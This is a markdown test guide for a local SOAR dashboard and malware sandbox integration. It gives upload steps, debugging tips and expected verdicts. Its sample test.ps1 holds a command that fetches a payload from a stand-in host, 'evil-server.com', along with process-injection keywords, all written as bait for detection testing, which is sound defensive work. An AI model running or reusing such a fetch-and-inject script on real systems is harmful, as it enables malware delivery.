# Test SOAR Dashboard Upload Integration

## 🚀 **Test Steps:**

### **1. Verify Sandbox Server is Running**
```bash
# Should show port 8001 listening
netstat -ano | findstr :8001
```

### **2. Test Upload with Simple Page**
**Open in browser:**
```
file:///c:/Users/shrey/Desktop/techsavishakara/techs/ZeroTrustAI/test_upload.html
```

### **3. Test Upload with SOAR Dashboard Code**
**Open in browser:**
```
file:///c:/Users/shrey/Desktop/techsavishakara/techs/ZeroTrustAI/soar_upload_test.html
```

### **4. Test Actual SOAR Dashboard**
**Open in browser:**
```
http://localhost:9000/soar-command-center.html
```

## 🧪 **Test Files:**

### **Use your `test.ps1` file:**
```powershell
# Test suspicious script
$url = "http://evil-server.com/payload"
Invoke-WebRequest $url
wscript.exe hidden
CreateRemoteThread -inject
VirtualAlloc -shellcode
```

## 🔍 **Debugging Steps:**

### **Check Browser Console:**
1. **Press F12** to open developer tools
2. **Go to Console tab**
3. **Look for these messages:**
   - 🚀 SOAR Dashboard: Starting upload...
   - 📁 File: test.ps1 XXX bytes
   - 🌐 Target: http://localhost:8001/analyze
   - 📊 Response status: 200
   - ✅ Analysis result: {...}

### **If CORS Error:**
- Check sandbox server has CORS middleware
- Check `allow_origins=["*"]` is set

### **If Connection Error:**
- Verify sandbox server is running on port 8001
- Check firewall isn't blocking the connection

## 🎯 **Expected Results:**

### **For `test.ps1` file:**
- **Static Analysis**: Should detect suspicious strings
- **Sandbox Analysis**: Should show malicious behavior
- **Final Verdict**: MALICIOUS
- **Risk Score**: 80-100
- **Action**: BLOCK & ALERT

## 📋 **Working Files:**

1. **✅ `sandbox_analyzer_simple.py`** - Fixed with CORS
2. **✅ `test_upload.html`** - Simple test page
3. **✅ `soar_upload_test.html`** - SOAR dashboard code test
4. **✅ `soar-command-center.html`** - Updated with debug logging

## 🌐 **Access Points:**

- **Sandbox Direct**: http://localhost:8001/sandbox
- **SOAR Dashboard**: http://localhost:9000/soar-command-center.html
- **Test Pages**: Use file:// protocol for local testing

**The integration should now work perfectly!** 🎉
